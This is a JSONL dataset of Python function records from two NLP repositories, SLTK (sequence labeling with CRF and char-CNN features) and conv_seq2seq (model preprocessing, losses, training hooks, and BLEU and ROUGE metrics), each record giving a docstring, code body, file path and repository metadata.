{"docstring": "\"\"\"\nArgs:\n    feats: size=(batch_size, seq_len, tag_size)\n    mask: size=(batch_size, seq_len)\n    tags: size=(batch_size, seq_len)\n\"\"\"\n", "func_signal": "def neg_log_likelihood_loss(self, feats, mask, tags):\n", "code": "batch_size = feats.size(0)\nforward_score, scores = self._forward_alg(feats, mask)\ngold_score = self._score_sentence(scores, mask, tags)\nif self.average_batch:\n    return (forward_score - gold_score) / batch_size\nreturn forward_score - gold_score", "path": "sltk\\nn\\modules\\crf.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\n\u4ece\u9884\u8bad\u7ec3\u7684\u6587\u4ef6\u4e2d\u6784\u5efaword embedding\u8868\nArgs:\n    word2id_dict: dict, \u5065: word, \u503c: word id\n    path_embed: str, \u9884\u8bad\u7ec3\u7684embedding\u6587\u4ef6\uff0cbin or txt\nReturns:\n    word_embed_table: np.array, shape=[word_count, embed_dim]\n    exact_match_count: int, \u7cbe\u786e\u5339\u914d\u7684\u8bcd\u6570\n    fuzzy_match_count: int, \u7cbe\u786e\u5339\u914d\u7684\u8bcd\u6570\n    unknown_count: int, \u672a\u5339\u914d\u7684\u8bcd\u6570\n\"\"\"\n", "func_signal": "def build_word_embed(word2id_dict, path_embed, seed=137):\n", "code": "import numpy as np\nassert path_embed.endswith('bin') or path_embed.endswith('txt')\nword2vec_model, word_dim = load_embed_with_gensim(path_embed)\nword_count = len(word2id_dict) + 1  # 0 is for padding value\nnp.random.seed(seed)\nscope = np.sqrt(3. / word_dim)\nword_embed_table = np.random.uniform(\n    -scope, scope, size=(word_count, word_dim)).astype('float32')\nexact_match_count, fuzzy_match_count, unknown_count = 0, 0, 0\nfor word in word2id_dict:\n    if word in word2vec_model.vocab:\n        word_embed_table[word2id_dict[word]] = word2vec_model[word]\n        exact_match_count += 1\n    elif word.lower() in word2vec_model.vocab:\n        word_embed_table[word2id_dict[word]] = word2vec_model[word.lower()]\n        fuzzy_match_count += 1\n    else:\n        unknown_count += 1\ntotal_count = exact_match_count + fuzzy_match_count + unknown_count\nreturn word_embed_table, exact_match_count, fuzzy_match_count, unknown_count, total_count", "path": "sltk\\utils\\embedding.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    inputs: 3D tensor, [bs, max_len, max_len_char]\n\nReturns:\n    char_conv_outputs: 3D tensor, [bs, max_len, output_dim]\n\"\"\"\n", "func_signal": "def forward(self, inputs):\n", "code": "max_len, max_len_char = inputs.size(1), inputs.size(2)\ninputs = inputs.view(-1, max_len * max_len_char)  # [bs, -1]\ninput_embed = self.char_embedding(inputs)  # [bs, ml*ml_c, feature_dim]\n# [bs, 1, max_len, max_len_char, feature_dim]\ninput_embed = input_embed.view(-1, 1, max_len, max_len_char, self.feature_dim)\n\n# conv\nchar_conv_outputs = []\nfor char_encoder in self.char_encoders:\n    conv_output = char_encoder(input_embed)\n    pool_output = torch.squeeze(torch.max(conv_output, -2)[0])\n    char_conv_outputs.append(pool_output)\nchar_conv_outputs = torch.cat(char_conv_outputs, dim=1)\n\n# size=[bs, max_len, output_dim]\nchar_conv_outputs = char_conv_outputs.transpose(-2, -1).contiguous()\n\nreturn char_conv_outputs", "path": "sltk\\nn\\modules\\feature.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\u9884\u6d4b\uff0c\u5c06\u7ed3\u679c\u5199\u5165\u6587\u4ef6\n\"\"\"\n", "func_signal": "def infer2file(self):\n", "code": "self.model.eval()\nfile_result = codecs.open(self.path_result, 'w', encoding='utf-8')\nconllu_reader = read_conllu(self.path_conllu, zip_format=False)\nfor feed_dict in self.data_iter:\n    feed_tensor_dict = self._get_inputs(feed_dict, self.model.use_cuda)\n\n    logits = self.model(**feed_tensor_dict)\n    # mask\n    mask = feed_tensor_dict[str(self.model.feature_names[0])] > 0\n    actual_lens = torch.sum(feed_tensor_dict[self.model.feature_names[0]] > 0, dim=1).int()\n    label_ids_batch = self.model.predict(logits, actual_lens, mask)\n    labels_batch = self.id2label(label_ids_batch)  # list(list(int))\n\n    # write to file\n    batch_size = len(labels_batch)\n    for i in range(batch_size):\n        feature_items = conllu_reader.__next__()\n        sent_len = len(feature_items)  # \u53e5\u5b50\u5b9e\u9645\u957f\u5ea6\n        labels = labels_batch[i]\n        if len(labels) < sent_len:  # \u8865\u5168\u4e3a`O`\n            labels = labels + ['O'] * (sent_len-len(labels))\n        for j in range(sent_len):\n            file_result.write('{0} {1}\\n'.format(' '.join(feature_items[j]), labels[j]))\n        file_result.write('\\n')\n\n    sys.stdout.write('sentence: {0} / {1}\\r'.format(self.data_iter.iter_variable, self.data_iter.data_count))\n    sys.stdout.flush()\nsys.stdout.write('sentence: {0} / {1}\\n'.format(self.data_iter.data_count, self.data_iter.data_count))\nsys.stdout.flush()\n\nfile_result.close()", "path": "sltk\\infer\\inference.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    input_dict: dict({str: LongTensor})\n\nReturns:\n    embed_outputs: 3D tensor, [bs, max_len, input_size]\n\"\"\"\n", "func_signal": "def forward(self, **input_dict):\n", "code": "embed_outputs = []\nfor i, feature_name in enumerate(self.feature_names):\n    embed_outputs.append(self.feature_embedding_list[i](input_dict[feature_name]))\nembed_outputs = torch.cat(embed_outputs, dim=2)  # size=[bs, max_len, input_size]\n\nreturn embed_outputs", "path": "sltk\\nn\\modules\\feature.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nDo the forward algorithm to compute the partition function (batched).\n\nArgs:\n    feats: size=(batch_size, seq_len, self.target_size+2)\n    mask: size=(batch_size, seq_len)\n\nReturns:\n    xxx\n\"\"\"\n", "func_signal": "def _forward_alg(self, feats, mask):\n", "code": "batch_size = feats.size(0)\nseq_len = feats.size(1)\ntag_size = feats.size(-1)\n\nmask = mask.transpose(1, 0).contiguous()\nins_num = batch_size * seq_len\n\nfeats = feats.transpose(1, 0).contiguous().view(\n    ins_num, 1, tag_size).expand(ins_num, tag_size, tag_size)\n\nscores = feats + self.transitions.view(\n    1, tag_size, tag_size).expand(ins_num, tag_size, tag_size)\nscores = scores.view(seq_len, batch_size, tag_size, tag_size)\n\nseq_iter = enumerate(scores)\ntry:\n    _, inivalues = seq_iter.__next__()\nexcept:\n    _, inivalues = seq_iter.next()\npartition = inivalues[:, self.START_TAG_IDX, :].clone().view(batch_size, tag_size, 1)\n\nfor idx, cur_values in seq_iter:\n    cur_values = cur_values + partition.contiguous().view(\n        batch_size, tag_size, 1).expand(batch_size, tag_size, tag_size)\n    cur_partition = log_sum_exp(cur_values, tag_size)\n\n    mask_idx = mask[idx, :].view(batch_size, 1).expand(batch_size, tag_size)\n\n    masked_cur_partition = cur_partition.masked_select(mask_idx)\n    if masked_cur_partition.dim() != 0:\n        mask_idx = mask_idx.contiguous().view(batch_size, tag_size, 1)\n        partition.masked_scatter_(mask_idx, masked_cur_partition)\n\ncur_values = self.transitions.view(1, tag_size, tag_size).expand(\n    batch_size, tag_size, tag_size) + partition.contiguous().view(\n        batch_size, tag_size, 1).expand(batch_size, tag_size, tag_size)\ncur_partition = log_sum_exp(cur_values, tag_size)\nfinal_partition = cur_partition[:, self.END_TAG_IDX]\nreturn final_partition.sum(), scores", "path": "sltk\\nn\\modules\\crf.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    model: SLModel\n    data_iter: DataIter\n    path_conllu: str, conllu\u683c\u5f0f\u7684\u6587\u4ef6\u8def\u5f84\n    path_result: str, \u9884\u6d4b\u7ed3\u679c\u5b58\u653e\u8def\u5f84\n    label2id_dict: dict({str: int})\n\"\"\"\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "for k in kwargs:\n    self.__setattr__(k, kwargs[k])\n\n# id2label dict\nself.id2label_dict = dict()\nfor label in self.label2id_dict:\n    self.id2label_dict[self.label2id_dict[label]] = label", "path": "sltk\\infer\\inference.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    feature_size: int, \u5b57\u7b26\u8868\u7684\u5927\u5c0f\n    feature_dim: int, \u5b57\u7b26embedding \u7ef4\u5ea6\n    require_grad: bool\uff0cchar\u7684embedding\u8868\u662f\u5426\u9700\u8981\u66f4\u65b0\n\n    filter_sizes: list(int), \u5377\u79ef\u6838\u5c3a\u5bf8\n    filter_nums: list(int), \u5377\u79ef\u6838\u6570\u91cf\n\"\"\"\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "super(CharFeature, self).__init__()\nfor k in kwargs:\n    self.__setattr__(k, kwargs[k])\n\n# char embedding layer\nself.char_embedding = nn.Embedding(self.feature_size, self.feature_dim)\ninit_embedding(self.char_embedding.weight)\n\n# cnn\nself.char_encoders = nn.ModuleList()\nfor i, filter_size in enumerate(self.filter_sizes):\n    f = nn.Conv3d(\n        in_channels=1, out_channels=self.filter_nums[i], kernel_size=(1, filter_size, self.feature_dim))\n    self.char_encoders.append(f)", "path": "sltk\\nn\\modules\\feature.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    vec: size=(batch_size, vanishing_dim, hidden_dim)\n    m_size: hidden_dim\n\nReturns:\n    size=(batch_size, hidden_dim)\n\"\"\"\n", "func_signal": "def log_sum_exp(vec, m_size):\n", "code": "_, idx = torch.max(vec, 1)  # B * 1 * M\nmax_score = torch.gather(vec, 1, idx.view(-1, 1, m_size)).view(-1, 1, m_size)  # B * M\nreturn max_score.view(-1, m_size) + torch.log(torch.sum(\n    torch.exp(vec - max_score.expand_as(vec)), 1)).view(-1, m_size)", "path": "sltk\\nn\\modules\\crf.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\u8bfb\u53d6conllu\u683c\u5f0f\u6587\u4ef6\nArgs:\n     path: str\n\nyield:\n    list(list)\n\"\"\"\n", "func_signal": "def read_conllu(path, zip_format=True):\n", "code": "pattern_space = re.compile('\\s+')\nfeature_items = []\nfile_data = codecs.open(path, 'r', encoding='utf-8')\nline = file_data.readline()\nline_idx = 1\nwhile line:\n    line = line.strip()\n    if not line:\n        # \u5224\u65ad\u662f\u5426\u5b58\u5728\u591a\u4e2a\u7a7a\u884c\n        if not feature_items:\n            print('\u5b58\u5728\u591a\u4e2a\u7a7a\u884c\uff01`{0}` line: {1}'.format(path, line_idx))\n            exit()\n\n        # \u5904\u7406\u4e0a\u4e00\u4e2a\u5b9e\u4f8b\n        if zip_format:\n            yield list(zip(*feature_items))\n        else:\n            yield feature_items\n\n        line = file_data.readline()\n        line_idx += 1\n        feature_items = []\n    else:\n        # \u8bb0\u5f55\u7279\u5f81\n        items = pattern_space.split(line)\n        feature_items.append(items)\n\n        line = file_data.readline()\n        line_idx += 1\n# the last one\nif feature_items:\n    if zip_format:\n        yield list(zip(*feature_items))\n    else:\n        yield feature_items\nfile_data.close()", "path": "sltk\\utils\\conllu.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n     inputs: list\n\"\"\"\n", "func_signal": "def forward(self, **feed_dict):\n", "code": "batch_size = feed_dict[self.feature_names[0]].size(0)\nmax_len = feed_dict[self.feature_names[0]].size(1)\n\n# word level feature\nword_feed_dict = {}\nfor i, feature_name in enumerate(self.feature_names):\n    word_feed_dict[feature_name] = feed_dict[feature_name]\nword_feature = self.word_feature_layer(**word_feed_dict)\n\n# char level feature\nif self.use_char:\n    char_feature = self.char_feature_layer(feed_dict['char'])\n    word_feature = torch.cat([word_feature, char_feature], 2)\n\nword_feature = self.dropout_feature(word_feature)\nword_feature = torch.transpose(word_feature, 1, 0)  # size=[max_len, bs, input_size]\n\n# rnn layer\nrnn_outputs = self.rnn_layer(word_feature)\nrnn_outputs = rnn_outputs.transpose(1, 0).contiguous()  # [bs, max_len, lstm_units]\n\nrnn_outputs = self.dropout_rnn(rnn_outputs.view(-1, rnn_outputs.size(-1)))\nrnn_feats = self.hidden2tag(rnn_outputs)\n\nreturn rnn_feats.view(batch_size, max_len, -1)", "path": "sltk\\nn\\modules\\sequence_labeling_model.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"\nArgs:\n    feature_names: list(str), \u7279\u5f81\u540d\u79f0, \u4e0d\u5305\u62ec`label`\u548c`char`\n\n    feature_size_dict: dict({str: int}), \u7279\u5f81\u8868\u5927\u5c0f\u5b57\u5178\n    feature_dim_dict: dict({str: int}), \u8f93\u5165\u7279\u5f81dim\u5b57\u5178\n    pretrained_embed_dict: dict({str: np.array})\n    require_grad_dict: bool, \u662f\u5426\u66f4\u65b0feature embedding\u7684\u6743\u91cd\n\n    # char parameters\n    use_char: bool, \u662f\u5426\u4f7f\u7528\u5b57\u7b26\u7279\u5f81, default is False\n    filter_sizes: list(int), \u5377\u79ef\u6838\u5c3a\u5bf8, default is [3]\n    filter_nums: list(int), \u5377\u79ef\u6838\u6570\u91cf, default is [32]\n\n    # rnn parameters\n    rnn_unit_type: str, options: ['rnn', 'lstm', 'gru']\n    num_rnn_units: int, rnn\u5355\u5143\u6570\n    num_layers: int, \u5c42\u6570\n    bi_flag: bool, \u662f\u5426\u53cc\u5411, default is True\n\n    use_crf: bool, \u662f\u5426\u4f7f\u7528crf\u5c42\n\n    dropout_rate: float, dropout rate\n\n    average_batch: bool, \u662f\u5426\u5bf9batch\u7684loss\u505a\u5e73\u5747\n    use_cuda: bool\n\"\"\"\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "super(SLModel, self).__init__()\nfor k in kwargs:\n    self.__setattr__(k, kwargs[k])\n\n# word level feature layer\nself.word_feature_layer = WordFeature(\n    feature_names=self.feature_names, feature_size_dict=self.feature_size_dict,\n    feature_dim_dict=self.feature_dim_dict, require_grad_dict=self.require_grad_dict,\n    pretrained_embed_dict=self.pretrained_embed_dict)\nrnn_input_dim = 0\nfor name in self.feature_names:\n    rnn_input_dim += self.feature_dim_dict[name]\n\n# char level feature layer\nif self.use_char:\n    self.char_feature_layer = CharFeature(\n        feature_size=self.feature_size_dict['char'], feature_dim=self.feature_dim_dict['char'],\n        require_grad=self.require_grad_dict['char'], filter_sizes=self.filter_sizes,\n        filter_nums=self.filter_nums)\n    rnn_input_dim += sum(self.filter_nums)\n\n# feature dropout\nself.dropout_feature = nn.Dropout(self.dropout_rate)\n\n# rnn layer\nself.rnn_layer = RNN(\n    rnn_unit_type=self.rnn_unit_type, input_dim=rnn_input_dim, num_rnn_units=self.num_rnn_units,\n    num_layers=self.num_layers, bi_flag=self.bi_flag)\n\n# rnn dropout\nself.dropout_rnn = nn.Dropout(self.dropout_rate)\n\n# crf layer\nself.target_size = self.feature_size_dict['label']\nargs_crf = dict({'target_size': self.target_size, 'use_cuda': self.use_cuda})\nargs_crf['average_batch'] = self.average_batch\nif self.use_crf:\n    self.crf_layer = CRF(**args_crf)\n\n# dense layer\nhidden_input_dim = self.num_rnn_units * 2 if self.bi_flag else self.num_rnn_units\ntarget_size = self.target_size + 2 if self.use_crf else self.target_size\nself.hidden2tag = nn.Linear(hidden_input_dim, target_size)\n\n# loss\nif not self.use_crf:\n    self.loss_function = nn.CrossEntropyLoss(ignore_index=0, size_average=False)\nelse:\n    self.loss_function = self.crf_layer.neg_log_likelihood_loss", "path": "sltk\\nn\\modules\\sequence_labeling_model.py", "repo_name": "liu-nlper/SLTK", "stars": 362, "license": "None", "language": "python", "size": 683}
{"docstring": "\"\"\"Creates the dictionary of predictions that is returned by the model.\n\"\"\"\n", "func_signal": "def _create_predictions(self, decoder_output, features, labels, losses=None):\n", "code": "predictions = {}\n\n# Add features and, if available, labels to predictions\npredictions.update(_flatten_dict({\"features\": features}))\nif labels is not None:\n  predictions.update(_flatten_dict({\"labels\": labels}))\n\nif losses is not None:\n  predictions[\"losses\"] = _transpose_batch_time(losses)\n\n# Decoders returns output in time-major form [T, B, ...]\n# Here we transpose everything back to batch-major for the user\noutput_dict = collections.OrderedDict(\n    zip(decoder_output._fields, decoder_output))\ndecoder_output_flat = _flatten_dict(output_dict)\n\ndecoder_output_flat = {\n    k: _transpose_batch_time(v)\n    for k, v in decoder_output_flat.items()\n}\npredictions.update(decoder_output_flat)\n\n# If we predict the ids also map them back into the vocab and process them\nif \"predicted_ids\" in predictions.keys():\n  vocab_tables = graph_utils.get_dict_from_collection(\"vocab_tables\")\n  target_id_to_vocab = vocab_tables[\"target_id_to_vocab\"]\n  predicted_tokens = target_id_to_vocab.lookup(\n      tf.to_int64(predictions[\"predicted_ids\"]))\n  # Raw predicted tokens\n  predictions[\"predicted_tokens\"] = predicted_tokens\n\nreturn predictions", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "#pylint: disable=R0201\n", "func_signal": "def test_rouge(self):\n", "code": "hypotheses = np.array([\n    \"The brown fox jumps over the dog \u7b11\",\n    \"The brown fox jumps over the dog 2 \u7b11\"\n])\nreferences = np.array([\n    \"The quick brown fox jumps over the lazy dog \u7b11\",\n    \"The quick brown fox jumps over the lazy dog \u7b11\"\n])\noutput = rouge.rouge(hypotheses, references)\n# pyrouge result: 0.84926\nnp.testing.assert_almost_equal(output[\"rouge_1/f_score\"], 0.865, decimal=2)\n# pyrouge result: 0.55238\nnp.testing.assert_almost_equal(output[\"rouge_2/f_score\"], 0.548, decimal=2)\n# pyrouge result 0.84926\nnp.testing.assert_almost_equal(output[\"rouge_l/f_score\"], 0.852, decimal=2)", "path": "seq2seq\\test\\metrics_test.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Utility function to read all available items from a DataProvider.\n\"\"\"\n", "func_signal": "def read_from_data_provider(data_provider):\n", "code": "item_values = data_provider.get(list(data_provider.list_items()))\nitems_dict = dict(zip(data_provider.list_items(), item_values))\nreturn items_dict", "path": "seq2seq\\data\\input_pipeline.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Returns the attention scores, sliced by source and target length.\n\"\"\"\n", "func_signal": "def _get_scores(predictions_dict):\n", "code": "prediction_len = _get_prediction_length(predictions_dict)\nsource_len = predictions_dict[\"features.source_len\"]\nreturn predictions_dict[\"attention_scores\"][:prediction_len, :source_len]", "path": "seq2seq\\tasks\\dump_attention.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Model-specific preprocessing for features and labels:\n\n- Creates vocabulary lookup tables for source and target vocab\n- Converts tokens into vocabulary ids\n\"\"\"\n\n# Create vocabulary lookup for source\n", "func_signal": "def _preprocess(self, features, labels):\n", "code": "source_vocab_to_id, source_id_to_vocab, source_word_to_count, _ = \\\n  vocab.create_vocabulary_lookup_table(self.source_vocab_info.path)\n\n# Create vocabulary look for target\ntarget_vocab_to_id, target_id_to_vocab, target_word_to_count, _ = \\\n  vocab.create_vocabulary_lookup_table(self.target_vocab_info.path)\n\n# Add vocab tables to graph colection so that we can access them in\n# other places.\ngraph_utils.add_dict_to_collection({\n    \"source_vocab_to_id\": source_vocab_to_id,\n    \"source_id_to_vocab\": source_id_to_vocab,\n    \"source_word_to_count\": source_word_to_count,\n    \"target_vocab_to_id\": target_vocab_to_id,\n    \"target_id_to_vocab\": target_id_to_vocab,\n    \"target_word_to_count\": target_word_to_count\n}, \"vocab_tables\")\n\n# Slice source to max_len\nif self.params[\"source.max_seq_len\"] is not None:\n  features[\"source_tokens\"] = features[\"source_tokens\"][:, :self.params[\n      \"source.max_seq_len\"]]\n  features[\"source_len\"] = tf.minimum(features[\"source_len\"],\n                                      self.params[\"source.max_seq_len\"])\n\n# Look up the source ids in the vocabulary\nfeatures[\"source_ids\"] = source_vocab_to_id.lookup(features[\n    \"source_tokens\"])\n\n# Maybe reverse the source\nif self.params[\"source.reverse\"] is True:\n  features[\"source_ids\"] = tf.reverse_sequence(\n      input=features[\"source_ids\"],\n      seq_lengths=features[\"source_len\"],\n      seq_dim=1,\n      batch_dim=0,\n      name=None)\n\nfeatures[\"source_len\"] = tf.to_int32(features[\"source_len\"])\ntf.summary.histogram(\"source_len\", tf.to_float(features[\"source_len\"]))\n\nif labels is None:\n  return features, None\n\nlabels = labels.copy()\n\n# Slices targets to max length\nif self.params[\"target.max_seq_len\"] is not None:\n  labels[\"target_tokens\"] = labels[\"target_tokens\"][:, :self.params[\n      \"target.max_seq_len\"]]\n  labels[\"target_len\"] = tf.minimum(labels[\"target_len\"],\n                                    self.params[\"target.max_seq_len\"])\n\n# Look up the target ids in the vocabulary\nlabels[\"target_ids\"] = target_vocab_to_id.lookup(labels[\"target_tokens\"])\n\nlabels[\"target_len\"] = tf.to_int32(labels[\"target_len\"])\ntf.summary.histogram(\"target_len\", tf.to_float(labels[\"target_len\"]))\n\n# Keep track of the number of processed tokens\nnum_tokens = tf.reduce_sum(labels[\"target_len\"])\nnum_tokens += tf.reduce_sum(features[\"source_len\"])\ntoken_counter_var = tf.Variable(0, \"tokens_counter\")\ntotal_tokens = tf.assign_add(token_counter_var, num_tokens)\ntf.summary.scalar(\"num_tokens\", total_tokens)\n\nwith tf.control_dependencies([total_tokens]):\n  features[\"source_tokens\"] = tf.identity(features[\"source_tokens\"])\n\n# Add to graph collection for later use\ngraph_utils.add_dict_to_collection(features, \"features\")\nif labels:\n  graph_utils.add_dict_to_collection(labels, \"labels\")\n\nreturn features, labels", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"In addition to standard gradient clipping, also clips embedding\ngradients to a specified value.\"\"\"\n", "func_signal": "def _clip_gradients(self, grads_and_vars):\n", "code": "grads_and_vars = super(Seq2SeqModel, self)._clip_gradients(grads_and_vars)\n\nclipped_gradients = []\nvariables = []\nfor gradient, variable in grads_and_vars:\n  if \"embedding\" in variable.name:\n    tmp = tf.clip_by_norm(\n        gradient.values, self.params[\"optimizer.clip_embed_gradients\"])\n    gradient = tf.IndexedSlices(tmp, gradient.indices, gradient.dense_shape)\n  clipped_gradients.append(gradient)\n  variables.append(variable)\nreturn list(zip(clipped_gradients, variables))", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Calculate the bleu score for hypotheses and references\nusing the MOSES ulti-bleu.perl script.\n\nArgs:\n  hypotheses: A numpy array of strings where each string is a single example.\n  references: A numpy array of strings where each string is a single example.\n  lowercase: If true, pass the \"-lc\" flag to the multi-bleu script\n\nReturns:\n  The BLEU score as a float32 value.\n\"\"\"\n\n", "func_signal": "def moses_multi_bleu(hypotheses, references, lowercase=False):\n", "code": "if np.size(hypotheses) == 0:\n  return np.float32(0.0)\n\n# Get MOSES multi-bleu script\ntry:\n  multi_bleu_path, _ = urllib.request.urlretrieve(\n      \"https://raw.githubusercontent.com/moses-smt/mosesdecoder/\"\n      \"master/scripts/generic/multi-bleu.perl\")\n  os.chmod(multi_bleu_path, 0o755)\nexcept: #pylint: disable=W0702\n  tf.logging.info(\"Unable to fetch multi-bleu.perl script, using local.\")\n  metrics_dir = os.path.dirname(os.path.realpath(__file__))\n  bin_dir = os.path.abspath(os.path.join(metrics_dir, \"..\", \"..\", \"bin\"))\n  multi_bleu_path = os.path.join(bin_dir, \"tools/multi-bleu.perl\")\n\n# Dump hypotheses and references to tempfiles\nhypothesis_file = tempfile.NamedTemporaryFile()\nhypothesis_file.write(\"\\n\".join(hypotheses).encode(\"utf-8\"))\nhypothesis_file.write(b\"\\n\")\nhypothesis_file.flush()\nreference_file = tempfile.NamedTemporaryFile()\nreference_file.write(\"\\n\".join(references).encode(\"utf-8\"))\nreference_file.write(b\"\\n\")\nreference_file.flush()\n\n# Calculate BLEU using multi-bleu script\nwith open(hypothesis_file.name, \"r\") as read_pred:\n  bleu_cmd = [multi_bleu_path]\n  if lowercase:\n    bleu_cmd += [\"-lc\"]\n  bleu_cmd += [reference_file.name]\n  try:\n    bleu_out = subprocess.check_output(\n        bleu_cmd, stdin=read_pred, stderr=subprocess.STDOUT)\n    bleu_out = bleu_out.decode(\"utf-8\")\n    bleu_score = re.search(r\"BLEU = (.+?),\", bleu_out).group(1)\n    bleu_score = float(bleu_score)\n  except subprocess.CalledProcessError as error:\n    if error.output is not None:\n      tf.logging.warning(\"multi-bleu.perl script returned non-zero exit code\")\n      tf.logging.warning(error.output)\n    bleu_score = np.float32(0.0)\n\n# Close temp files\nhypothesis_file.close()\nreference_file.close()\n\nreturn np.float32(bleu_score)", "path": "seq2seq\\metrics\\bleu.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Removes the prefix from the variable name.\n\"\"\"\n", "func_signal": "def varname_in_checkpoint(name):\n", "code": "prefix_parts = self.params[\"prefix\"].split(\"/\")\ncheckpoint_prefix = \"/\".join(prefix_parts[:-1])\nreturn name.replace(checkpoint_prefix + \"/\", \"\")", "path": "seq2seq\\training\\hooks.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Runs SyncReplicasOptimizer initialization ops.\"\"\"\n\n", "func_signal": "def after_create_session(self, session, coord):\n", "code": "if not self._sync_optimizer:\n  return\n\ntf.logging.info(\"Found SyncReplicasOptimizer. Initializing.\")\n\nlocal_init_success, msg = session_manager._ready(  # pylint: disable=protected-access\n    self._ready_for_local_init_op, session,\n    \"Model is not ready for SyncReplicasOptimizer local init.\")\nif not local_init_success:\n  raise RuntimeError(\n      \"Init operations did not make model ready for SyncReplicasOptimizer \"\n      \"local_init. Init op: %s, error: %s\" %\n      (self._local_init_op.name, msg))\nsession.run(self._local_init_op)\nif self._init_tokens_op is not None:\n  session.run(self._init_tokens_op)\nif self._q_runner is not None:\n  self._q_runner.create_threads(\n      session, coord=coord, daemon=True, start=True)", "path": "seq2seq\\training\\hooks.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Computes the loss for this model.\n\nReturns a tuple `(losses, loss)`, where `losses` are the per-batch\nlosses and loss is a single scalar tensor to minimize.\n\"\"\"\n#pylint: disable=R0201\n# Calculate loss per example-timestep of shape [B, T]\n\n", "func_signal": "def compute_loss(self, decoder_output, _features, labels):\n", "code": "losses = seq2seq_losses.cross_entropy_sequence_loss(\n    logits=decoder_output.logits[:, :, :],\n    targets=tf.transpose(labels[\"target_ids\"][:, 1:], [1, 0]),\n    sequence_length=labels[\"target_len\"] - 1)\n\n# Calculate the average log perplexity\nloss = tf.reduce_sum(losses) / tf.to_float(\n    tf.reduce_sum(labels[\"target_len\"] - 1))\n\nreturn losses, loss", "path": "seq2seq\\models\\seq2seq_model.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Tests a MetricSpec\"\"\"\n", "func_signal": "def _test_metric_spec(self, metric_spec, hyps, refs, expected_scores):\n", "code": "predictions = {\"predicted_tokens\": tf.placeholder(dtype=tf.string)}\nlabels = {\"target_tokens\": tf.placeholder(dtype=tf.string)}\n\nvalue, update_op = metric_spec.create_metric_ops(None, labels, predictions)\n\nwith self.test_session() as sess:\n  sess.run(tf.global_variables_initializer())\n  sess.run(tf.local_variables_initializer())\n\n  scores = []\n  for hyp, ref in zip(hyps, refs):\n    hyp = hyp.split(\" \")\n    ref = ref.split(\" \")\n    sess.run(update_op, {\n        predictions[\"predicted_tokens\"]: [hyp],\n        labels[\"target_tokens\"]: [ref]\n    })\n    scores.append(sess.run(value))\n\n  for score, expected in zip(scores, expected_scores):\n    np.testing.assert_almost_equal(score, expected, decimal=2)\n    np.testing.assert_almost_equal(score, expected, decimal=2)", "path": "seq2seq\\test\\metrics_test.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
{"docstring": "\"\"\"Accumulates strings into a vector.\n\nArgs:\n  values: A 1-d string tensor that contains values to add to the accumulator.\n\nReturns:\n  A tuple (value_tensor, update_op).\n\"\"\"\n", "func_signal": "def accumulate_strings(values, name=\"strings\"):\n", "code": "tf.assert_type(values, tf.string)\nstrings = tf.Variable(\n    name=name,\n    initial_value=[],\n    dtype=tf.string,\n    trainable=False,\n    collections=[],\n    validate_shape=True)\nvalue_tensor = tf.identity(strings)\nupdate_op = tf.assign(\n    ref=strings, value=tf.concat([strings, values], 0), validate_shape=False)\nreturn value_tensor, update_op", "path": "seq2seq\\metrics\\metric_specs.py", "repo_name": "tobyyouup/conv_seq2seq", "stars": 306, "license": "apache-2.0", "language": "python", "size": 459}
